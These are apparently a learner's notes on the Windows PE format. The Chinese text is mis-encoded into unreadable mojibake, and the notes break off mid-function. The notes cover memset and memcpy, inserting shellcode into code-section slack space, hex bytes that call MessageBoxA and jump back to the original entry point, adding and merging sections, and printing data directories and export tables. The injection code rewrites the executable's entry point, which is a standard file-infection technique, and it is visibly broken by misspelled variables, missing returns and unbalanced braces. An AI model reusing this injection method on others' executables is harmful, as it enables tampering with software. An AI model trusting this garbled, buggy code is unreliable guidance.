å®ƒåœ¨FileBufferçŠ¶æ€å’ŒImageBufferçŠ¶æ€æ˜¯ä¸ç›¸åŒçš„ï¼Œå®ƒä»¬èŠ‚è¡¨ä¹‹é—´å¤åˆ¶è½¬æ¢åˆ°ImageBufferæ˜¯éœ€è¦æ‹‰é•¿èŠ‚è¡¨ï¼Œæ‰€ä»¥ åœ¨æ“ä½œçš„æ—¶å€™æ˜¯éœ€è¦ç¡®å®šFileBufferåˆ°ImageBufferä¹‹åImageBufferçš„å¤§å°æ˜¯å¤šå°‘ï¼Œè€Œè¿™ä¸ªå¤§å°ï¼Œå·²ç»åœ¨å¯é€‰PEå¤´ é‡Œé¢çš„æŸä¸€ä¸ªå€¼ä¸­å·²ç»ç»™å‡ºæ¥äº† â€”\u003e SizeOfImage ;\nvoid* memset( void* ptr,int value,size_t num ); memset()å‡½æ•°ç”¨æ¥å°†æŒ‡å®šå†…å­˜çš„å‰nä¸ªå­—èŠ‚è®¾ç½®ä¸ºç‰¹å®šçš„å€¼;\nå‚æ•°è¯´æ˜ï¼š ptrï¼šä¸ºè¦æ“ä½œçš„å†…å­˜çš„æŒ‡é’ˆ; valueï¼šä¸ºè¦è®¾ç½®çš„å€¼;æ—¢å¯ä»¥å‘valueä¼ é€’intç±»å‹çš„å€¼,ä¹Ÿå¯ä»¥ä¼ é€’charç±»å‹çš„å€¼ï¼Œintå’Œcharå¯ä»¥æ ¹æ®ASCIIç ç›¸äº’è½¬æ¢; numï¼šä¸ºptrçš„å‰numä¸ªå­—èŠ‚ï¼Œsize_tå°±æ˜¯unsigned intã€‚ å‡½æ•°è¯´æ˜ï¼šmemset()ä¼šå°†ptræ‰€æŒ‡çš„å†…å­˜åŒºåŸŸçš„å‰numä¸ªå­—èŠ‚çš„å€¼éƒ½è®¾ç½®ä¸ºvalueï¼Œç„¶åè¿”å›æŒ‡å‘ptrçš„æŒ‡é’ˆï¼›\nvoid* memcpy (void* dest,const void* src,size_t num); memcpy()å‡½æ•°åŠŸèƒ½ç”¨æ¥å¤åˆ¶å†…å­˜çš„ï¼›å¥¹ä¼šå¤åˆ¶srcæ‰€æŒ‡å‘å†…å®¹çš„é¦–åœ°å€ï¼Œä½œä¸ºèµ·å§‹ä½ç½®ï¼Œç„¶ååç§»numä¸ªå­—èŠ‚åˆ°destæ‰€æŒ‡çš„å†…å­˜åœ°å€ çš„ä½ç½®ï¼›æ­¤å‡½æ•°æœ‰ä¸ªç‰¹å¾å°±æ˜¯ï¼Œå¥¹å¹¶ä¸å…³å¿ƒè¢«å¤åˆ¶çš„æ•°æ®ç±»å‹ï¼Œåªæ˜¯é€å­—èŠ‚åœ°è¿›è¡Œå¤åˆ¶ï¼Œè¿™ç»™å‡½æ•°çš„ä½¿ç”¨å¸¦æ¥äº†å¾ˆå¤§çš„çµæ´»æ€§ï¼Œ å¯ä»¥é¢å‘ä»»ä½•æ•°æ®ç±»å‹è¿›è¡Œå¤åˆ¶ï¼›\néœ€è¦æ³¨æ„çš„æ˜¯ï¼š destæŒ‡é’ˆè¦åˆ†é…è¶³å¤Ÿçš„ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯è¦å¤§äºç­‰äºnumå­—èŠ‚çš„ç©ºé—´ï¼Œå¦‚æœæ²¡æœ‰åˆ†é…è¶³å¤Ÿçš„ç©ºé—´ä¼šå‡ºç°é”™è¯¯ï¼› destå’Œsrcæ‰€æŒ‡çš„å†…å­˜ç©ºé—´ä¸èƒ½é‡å ï¼ˆå¦‚æœå‘ç”Ÿäº†é‡å ï¼Œä½¿ç”¨memmove()ä¼šæ›´åŠ å®‰å…¨ï¼‰ã€‚\nä»£ç èŠ‚ç©ºç™½åŒºæ·»åŠ ä»£ç  åœ¨ä»£ç ç©ºç™½åŒºæ·»åŠ ä»£ç ï¼ˆæ‰‹åŠ¨ï¼‰\næˆ‘æ‰¾çš„è¿™ä¸ªç¨‹åºæ˜¯ä¹‹å‰çš„é‚£ä¸ªcrackmeï¼Œç”±äºæ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥è¦ç®—ä¸€ä¸‹ã€‚CODEèŠ‚å¼€å¤´åœ¨æ–‡ä»¶ä¸­æ˜¯600hï¼Œåœ¨å†…å­˜ä¸­æ˜¯1000hï¼Œæ¢ç®—å…³ç³»ä¸ºï¼šå†…å­˜åœ°å€ = æ–‡ä»¶åœ°å€ - 600 + 1000ã€‚é˜²æ­¢å¤´æ™•æ‰€ä»¥å…¨éƒ¨è½¬ä¸ºå†…å­˜åœ°å€è®¡ç®—å°±å¯ä»¥äº†ï¼Œè§†é¢‘ä¸­è¯´çš„é‚£ä¸ªMessageboxAåœ°å€å°±ç›´æ¥ç”¨CODEèŠ‚é‚£é‡Œé¢çš„å‡½æ•°åœ°å€æ˜¯CODE:0040143Aã€‚åŠ åˆ°ç¬¬ä¸€ä¸ªèŠ‚çš„æ–‡ä»¶ä¸­çš„B90ä½ç½®ï¼Œä»”ç»†ç®—ä¸€ä¸‹è¦è·³çš„åœ°å€å°±è¡Œï¼Œä¸€å®šè¦æŒ‰å°ç«¯åºæ¥å†™ï¼š\n6A 00 6A 00 6A 00 6A 00 E8 9D FE FF FF E9 5E FA FF FF å†å°†oepæ”¹ä¸º1590hå°±å¥½äº†ã€‚\nä»»æ„ä»£ç ç©ºç™½åŒºæ·»åŠ ä»£ç  å‘ä»£ç èŠ‚æ·»åŠ ä»£ç ç¼–ç¨‹å®ç°\nVOID ADDCodeInCodeSec() { LPVOID pFileBuffer = NULL; LPVOID pImageBuffer = NULL; LPVOID pNewBuffer = NULL; PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; PBYTE codeBegin = NULL; BOOL isOK = FALSE; DWORD size = 0; ReadPEFile(FilePath_In,\u0026pFileBuffer); if(!pFileBuffer) { return ; } CopyFileBufferToImageBuffer(pFileBuffer,\u0026pImageBuffer); if(!pFileBuffer) { free(pFileBuffer); return ; } pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer; pOprionHeader = (PIMAGE_OPTIONAL_HEADER32)(((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew) + 4 + IMAGE_SIZEOF_FILE_HEADER); pSectionHeader = (PIMAGE_SECTION_HEADER)(((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew) + 4 + IMAGE_SIZEOF_FILE_HEADER + IMAGE_SIZEOF_NT_OPTIONAL32_HEADER); if (((pSectionHeader-\u003eSizeOfRawData) - (pSectionHeader-\u003eMisc.VirtualSize)) \u003c SHELLCODELENGTH) { free(pFileBuffer); free(pImageBuffer); } codeBegin = (PBYTE)((DWORD)pImageBuffer + pSectionHeader-\u003eVirtualAddress + pSectionHeader-\u003eMisc.VirtualSize); printf(\"pSectionHeader-\u003eVirtualAddress: %#010X\\r\\n\", pSectionHeader-\u003eVirtualAddress); printf(\"pSectionHeader-\u003eMisc.VirtualSize: %#010X\\r\\n\", pSectionHeader-\u003eMisc.VirtualSize); printf(\"codeBegin: %#010X\\r\\n\", codeBegin); memcpy(codeBegin,ShellCode,SHELLCODELENGTH); DWORD callAddr = (MESSAGEBOXADDR - (pOptionHeader-\u003eImageBase + ((DWORD)(codeBegin + 0xD) - (DWORD)pImageBuffer))); printf(\"callAddr ---\u003e %#010X \\r\\n\",callAddr); *(PDWORD)(codeBegin + 0x09) = callAddr; printf(\"*(PWORD)(codeBegin + 0x09) ---\u003e %#010X \\r\\n\",*(PDWORD)(codeBegin + 0x09)); DWORD jmpAddr = ((pOptionHeader-\u003eImageBase + pOptionHeader-\u003eAddressOfEntryPoint) - (pOptionHeader-\u003eImageBase + ((DWORD)(codeBegin + SHELLCODELENGTH) - (DWORD)pImageBuffer))); printf(\"jmpAddr ---\u003e %#010X \\r\\n\",jmpAddr); *(PDWORD)(codeBegin + 0x0E) = jmpAddr; printf(\"*(PWORD)(codeBegin + 0x0E) ---\u003e %#010X \\r\\n\",*(PDWORD)(codeBegin + 0x0E)); printf(\"pOptionHeader-\u003eAddressOfEntryPoint ---\u003e %#010X \\r\\n\",pOptionHeader-\u003eAddressOfEntryPoint); printf(\"(DWORD)codeBegin ---\u003e %#010X \\r\\n\",((DWORD)codeBegin - (DWORD)pImageBuffer)); pOptionHeader-\u003eAddressOfEntryPoint = (DWORD)codeBegin - (DWORD)pImageBuffer; printf(\"pOptionHeader-\u003eAddressOfEntryPoint ---\u003e %#010X \\r\\n\",pOptionHeader-\u003eAddressOfEntryPoint); size = CopyImageBufferToNewBuffer(pImageBuffer,\u0026pNewBuffer); if (size == 0 || !pNewBuffer) { free(pFileBuffer); free(pImageBuffer); return ; } isOK = MemeryTOFile(pNewBuffer,size,FilePath_Out); if (isOK) { return ; } free(pFileBuffer); free(pImageBuffer); free(pNewBuffer); } } å‘å…¶ä»–èŠ‚ç©ºç™½åŒºæ·»åŠ ä»£ç ç¼–ç¨‹å®ç°\næ–°å¢èŠ‚-æ·»åŠ ä»£ç  æ‰‹åŠ¨æ–°å¢ä¸€ä¸ªèŠ‚è¡¨å’ŒèŠ‚ï¼Œä¿è¯ä¿®æ”¹åçš„ç¨‹åºèƒ½æ­£ç¡®æ‰§è¡Œ\næ”¹SizeOfImage æ”¹èŠ‚çš„ä¸ªæ•° åŠ ä¸€ä¸ªèŠ‚è¡¨ï¼Œå¹¶ä¿®æ­£ åˆ°æ–‡ä»¶æœ€ååŠ å¯¹åº”å¤§å°çš„ä½ç½® ç¼–ç¨‹å®ç°ï¼šæ–°å¢ä¸€ä¸ªèŠ‚ï¼Œå¹¶æ·»åŠ ä»£ç \nBOOL AddFileBufferToSectionTable(IN LPVOID pFileBuffer,OUT LPVOID* pNewBuffer,IN const char* sectionTable,IN size_t SsectionTableSize) { PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; //NTå¤´ PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-\u003ee_lfanew); //æ ‡å‡†PEå¤´ PIMAGE_FILE_HEADER pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 0x4); //å¯é€‰PEå¤´ PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); //èŠ‚è¡¨è§£æ PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pPEHeader-\u003eSizeOfOptionalHeader); //è®¡ç®—ç©ºé—´æ˜¯å¦è¶³å¤Ÿ DWORD whiteSpaceSize = 0; whiteSpaceSize = pNTHeader-\u003eOptionalHeader.SizeOfHeaders - (pDosHeader-\u003ee_lfanew + sizeof(pNTHeader-\u003eSignature) + sizeof(pNTHeader-\u003eFileHeader) + pPEHeader-\u003eSizeOfOptionalHeader + ((pNTHeader-\u003eFileHeader.NumberOfSections + 1) * sizeof(IMAGE_SECTION_HEADER))); if (whiteSpaceSize \u003c sizeof(IMAGE_SECTION_HEADER)) { printf(\"æ•°æ®ç¼“å†²åŒºå¤ªå°æ— æ³•æ·»åŠ èŠ‚è¡¨ï¼\"); return false; } //Copyä¸€ä¸ªæ–°çš„èŠ‚è¡¨ char* pTmpFile = (char*)pFileBuffer; char* pTmpFileCopy = (char*)pFileBuffer; pTmpFile = pTmpFile + (pDosHeader-\u003ee_lfanew + sizeof(pNTHeader-\u003eSignature) + sizeof(pNTHeader-\u003eFileHeader) + pPEHeader-\u003eSizeOfOptionalHeader); pTmpFileCopy = pTmpFileCopy + (pDosHeader-\u003ee_lfanew + sizeof(pNTHeader-\u003eSignature) + sizeof(pNTHeader-\u003eFileHeader) + pPEHeader-\u003eSizeOfOptionalHeader + ((pNTHeader-\u003eFileHeader.NumberOfSections) * sizeof(IMAGE_SECTION_HEADER))); memcpy(pTmpFileCopy, pTmpFile, sizeof(IMAGE_SECTION_HEADER)); //åœ¨æ–°å¢èŠ‚åé¢ å¡«å……ä¸€ä¸ªèŠ‚å¤§å°çš„000 (å¿½ç•¥) //ä¿®æ”¹PEå¤´ä¸­èŠ‚çš„æ•°é‡ pPEHeader-\u003eNumberOfSections = pPEHeader-\u003eNumberOfSections + 1; //ä¿®æ”¹sizeOfImageçš„å¤§å° pOptionHeader-\u003eSizeOfImage = pOptionHeader-\u003eSizeOfImage + SsectionTableSize; //å†åŸæœ‰æ•°æ®çš„æœ€åï¼Œæ–°å¢ä¸€ä¸ªèŠ‚çš„æ•°æ®(å†…å­˜å¯¹é½çš„æ•´æ•°å€) //ä½¿ç”¨PEç»“æ„è®¡ç®—æ–‡ä»¶å¤§å° PIMAGE_SECTION_HEADER pTempSectionHeaderTo = pSectionHeader; for (DWORD i = 2; i \u003c pPEHeader-\u003eNumberOfSections; i++) pTempSectionHeaderTo++; DWORD fileSize = pTempSectionHeaderTo-\u003eSizeOfRawData + pTempSectionHeaderTo-\u003ePointerToRawData; //ç”³è¯·Fileå¤§å°ç©ºé—´ *pNewBuffer = (PDWORD)malloc(fileSize + SsectionTableSize); if (!*pNewBuffer) { printf(\"%s\", \"ç”³è¯·ImageBufferå¤±è´¥ï¼\"); free(*pNewBuffer); return false; } memset(*pNewBuffer, 0, fileSize + SsectionTableSize); //ä¿®æ­£èŠ‚è¡¨å±æ€§ PIMAGE_SECTION_HEADER pTempSectionHeaderTo2 = (PIMAGE_SECTION_HEADER)pTmpFileCopy; memcpy(pTempSectionHeaderTo2-\u003eName, sectionTable, 4); pTempSectionHeaderTo2-\u003eMisc.VirtualSize = SsectionTableSize; pTempSectionHeaderTo2-\u003eVirtualAddress = pTempSectionHeaderTo-\u003eVirtualAddress + Align(pTempSectionHeaderTo-\u003eMisc.VirtualSize, pNTHeader-\u003eOptionalHeader.SectionAlignment); pTempSectionHeaderTo2-\u003eSizeOfRawData = Align(SsectionTableSize, pNTHeader-\u003eOptionalHeader.FileAlignment); pTempSectionHeaderTo2-\u003ePointerToRawData = pTempSectionHeaderTo-\u003ePointerToRawData + Align(pTempSectionHeaderTo-\u003eSizeOfRawData, pNTHeader-\u003eOptionalHeader.FileAlignment); memcpy(*pNewBuffer, pFileBuffer, fileSize); return true; } ç¼–ç¨‹å®ç°ï¼šæ‰©å¤§æœ€åä¸€ä¸ªèŠ‚ï¼Œå¹¶æ·»åŠ ä»£ç \næ‰©å¤§èŠ‚-åˆå¹¶èŠ‚-æ•°æ®ç›®å½• æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚ï¼Œä¿è¯ç¨‹åºæ­£å¸¸è¿è¡Œ\næ”¹SizeOfImage æ”¹å¤§SizeOfRawDataå’ŒVirtualSize åˆ°æ–‡ä»¶æœ€ååŠ å¯¹åº”å¤§å°çš„ä½ç½® å°†æ‰€æœ‰èŠ‚åˆå¹¶ï¼Œä¿è¯ç¨‹åºæ­£å¸¸è¿è¡Œ\næ”¹èŠ‚çš„ä¸ªæ•°ä¸º1\nåˆ å»å¤šä½™èŠ‚è¡¨ï¼Œå¹¶è°ƒæ•´å‰©ä¸‹è¿™ä¸ªèŠ‚çš„VirtualSizeå’ŒSizeOfRawDataä¸ºï¼š\nMax = SizeOfRawData\u003eVirtualSize?SizeOfRawData:VirtualSize\nSizeOfRawData = VirtualSize = æœ€åä¸€ä¸ªèŠ‚çš„VirtualAddress + Max - SizeOfHeaderså†…å­˜å¯¹é½åçš„å¤§å°\nå…¶å®å°±æ˜¯æ‰€æœ‰èŠ‚å¯¹é½åçš„å¤§å°ï¼Œå°±æ˜¯SizeOfImage - SizeOfHeadersï¼Œå€¼åº”è¯¥æ˜¯ä¸€æ ·çš„\næ”¹è¿™ä¸€ä¸ªèŠ‚çš„å±æ€§ä¸ºå…¨éƒ¨å±æ€§E0000060\nå®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿè¿”å›å¯¹é½åçš„å¤§å°Align(int x,int y)ï¼Œyæ˜¯å¯¹é½å¤§å°\nint Align(int x, int y) { int i; if (x \u003c= y) { return y; } for (i = 1; i \u003c= x / y; i++) { if (x - y * (i - 1) \u003e 0 \u0026\u0026 x - y * i \u003c= 0) { return y * i; } } return y * i; } ç¼–ç¨‹è¾“å‡ºå…¨éƒ¨ç›®å½•é¡¹ï¼ˆ16ä¸ªï¼‰\nDWORD PrintDriectory(LPVOID pImageBuffer){ //å®šä¹‰PEå¤´çš„ä¿¡æ¯ PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pImageBuffer) { printf(\"error\"); return 0; } //åˆ¤æ–­æ˜¯ä¸æ˜¯exeæ–‡ä»¶ if(*((PWORD)pImageBuffer) != IMAGE_DOS_SIGNATURE) { printf(\"error\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer; if(*((PDWORD)((BYTE *)pImageBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE){ printf(\"error\"); return 0; } //è¯»å–pFileBuffer è·å–DOSå¤´ï¼ŒPEå¤´ï¼ŒèŠ‚è¡¨ç­‰ä¿¡æ¯ pDosHeader =(PIMAGE_DOS_HEADER)pImageBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew); //æ‰“å°NTå¤´\tpPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4); //åŠ 4ä¸ªå­—èŠ‚åˆ°äº†æ ‡å‡†PEå¤´ pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); //æ ‡å‡†PEå¤´+æ ‡å‡†PEå¤´çš„å¤§å° 20 printf(\"===å¯¼å‡ºè¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[0].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[0].Size); printf(\"===å¯¼å…¥è¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[1].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[1].Size); printf(\"===èµ„æºè¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[2].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[2].Size); printf(\"===å¼‚å¸¸ä¿¡æ¯è¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[3].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[3].Size); printf(\"===å®‰å…¨è¯ä¹¦è¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[4].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[4].Size); printf(\"===é‡å®šä½è¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[5].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[5].Size);\tprintf(\"===è°ƒè¯•ä¿¡æ¯è¡¨è¯ä¹¦è¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[6].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[6].Size); printf(\"===ç‰ˆæƒæ‰€æœ‰è¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[7].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[7].Size); printf(\"===å…¨å±€æŒ‡é’ˆè¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[8].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[8].Size); printf(\"===TLSè¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[9].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[9].Size); printf(\"===åŠ è½½é…ç½®è¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[10].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[10].Size); printf(\"===ç»‘å®šå¯¼å…¥è¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[11].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[11].Size); printf(\"====IATè¡¨===\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[12].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[12].Size); printf(\"====å»¶è¿Ÿå¯¼å…¥===\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[13].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[13].Size); printf(\"====COM===\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[14].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[14].Size); printf(\"====ä¿ç•™===\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[15].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[15].Size); return 1; } é™æ€é“¾æ¥åº“-åŠ¨æ€é“¾æ¥åº“ åˆ›å»ºä¸€ä¸ªé™æ€é“¾æ¥åº“ï¼Œå¹¶åœ¨ä»£ç ä¸­ä½¿ç”¨\nå®Œæˆï¼Œæ³¨æ„åç§°ç›¸åŒ\nåˆ›å»ºä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œä½¿ç”¨ä¸¤ç§æ–¹å¼è¿›è¡Œå¯¼å‡º(_declspec(dllexport)ä¸.defæ–‡ä»¶)\nå®Œæˆ\nåˆ†åˆ«ä½¿ç”¨éšå¼é“¾æ¥å’Œæ˜¾ç¤ºé“¾æ¥ä½¿ç”¨ä¸€ä¸ªDLLæ–‡ä»¶\nå®Œæˆï¼Œæ³¨æ„æ˜¾ç¤ºé“¾æ¥è¦åŒ…å«windows.hå¤´æ–‡ä»¶\nå¯¼å‡ºè¡¨ ç¼–å†™ç¨‹åºæ‰“å°æ‰€æœ‰çš„å¯¼å‡ºè¡¨ä¿¡æ¯\nDWORD PrintExport(LPVOID pFileBuffer){ //å®šä¹‰PEå¤´çš„ä¿¡æ¯ PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pFileBuffer) { printf(\"error\"); return 0; } //åˆ¤æ–­æ˜¯ä¸æ˜¯exeæ–‡ä»¶ if(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE) { printf(\"error\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if(*((PDWORD)((BYTE *)pFileBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE){ printf(\"error\"); return 0; } //è¯»å–pFileBuffer è·å–DOSå¤´ï¼ŒPEå¤´ï¼ŒèŠ‚è¡¨ç­‰ä¿¡æ¯ pDosHeader =(PIMAGE_DOS_HEADER)pFileBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-\u003ee_lfanew); //æ‰“å°NTå¤´\tpPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4); //åŠ 4ä¸ªå­—èŠ‚åˆ°äº†æ ‡å‡†PEå¤´ pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); //æ ‡å‡†PEå¤´+æ ‡å‡†PEå¤´çš„å¤§å° 20 printf(\"===å¯¼å‡ºè¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[0].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[0].Size); printf(\"===ç»“æ„===\\n\"); PIMAGE_EXPORT_DIRECTORY Export_Directory = (PIMAGE_EXPORT_DIRECTORY)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,pOptionHeader-\u003eDataDirectory[0].VirtualAddress)); printf(\"Name:%s\\n\",(char*)pFileBuffer + RvaToFileOffset(pFileBuffer,Export_Directory-\u003eName)); printf(\"Base:%x\\n\",Export_Directory-\u003eBase); printf(\"NumberOfFunctions:%x\\n\",Export_Directory-\u003eNumberOfFunctions); printf(\"NumberOfNames:%x\\n\",Export_Directory-\u003eNumberOfNames); printf(\"AddressOfFunctions: %x\\n\", Export_Directory-\u003e AddressOfFunctions); printf(\"AddressOfNames;: %x\\n\", Export_Directory-\u003e AddressOfNames); printf(\"AddressOfNameOrdinals;: %x\\n\\n\", Export_Directory-\u003e AddressOfNameOrdinals); return 1; } GetFunctionAddrByName(FileBufferæŒ‡é’ˆï¼Œå‡½æ•°åæŒ‡é’ˆ)\nDWORD GetFunctionAddrByName(PVOID pFileBuffer,char* FuncName){ PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pFileBuffer) { printf(\"error\"); return 0; } if(*((PWORD)pFileBuffer)!=IMAGE_DOS_SIGNATURE) { printf(\"error\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if(*((PWORD)((BYTE *)pFileBUffer+pDosHesder-\u003ee_lfanew)) !=IMAGE_NT_SIGNATURE){ printf(\"error\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBUffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBUffer + pDosHeader-\u003ee_lfanew); pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader)+4); PIMAGE_EXPORT_DIRECTORY Export_Directory = (PIMAGE_EXPORT_DIRECTORY)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,pOptionHeader-\u003eDataDirectory[0].VirtualAddress)); DWORD* AddressOfNamesFunctionsAddress = (DWORD*)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,Export_Directory-\u003eAddressOfNames)); WORD* AddressOfNameOrdinalsAddress =(WORD*)((DWORD)pFileBuffer + RvaToFileOffset(pFileBuffer,Export_Directory-\u003eAddressOfNameOrdinals)); DWORD* AddressOfFunctionsAddress = (DWORD*)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,Export_Directory-\u003eAddressOfFunctions)); for(int x =0;x\u003cExport_Directory-\u003eNumberOfNames;x++,AddressOfNamesFunctionsAddress++) { if (*FuncName == *((char*)pFileBuffer+RvaToFileOffset(pFileBuffer,*AddressOfNamesFunctionsAddress))) { printf(\"å‡½æ•°åœ°å€:%x\\n\",AddressOfFunctionsAddress[AddressOfNameOrdinalsAddress[x]]); } } GetFunctionAddrByOrdinals(FileBufferæŒ‡é’ˆï¼Œå‡½æ•°åå¯¼å‡ºåºå·)\nDWORD GetFunctionAddrByOrdinals(LPVOID pFileBuffer,DWORD FunctionOrdinals){ PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pFileBuffer) { printf(\"error\"); return 0; } //åˆ¤æ–­æ˜¯ä¸æ˜¯exeæ–‡ä»¶ if(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE) { printf(\"error\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if(*((PDWORD)((BYTE *)pFileBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE){ printf(\"error\"); return 0; } //è¯»å–pFileBuffer è·å–DOSå¤´ï¼ŒPEå¤´ï¼ŒèŠ‚è¡¨ç­‰ä¿¡æ¯ pDosHeader =(PIMAGE_DOS_HEADER)pFileBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-\u003ee_lfanew); //æ‰“å°NTå¤´\tpPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4); //åŠ 4ä¸ªå­—èŠ‚åˆ°äº†æ ‡å‡†PEå¤´ pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); //æ 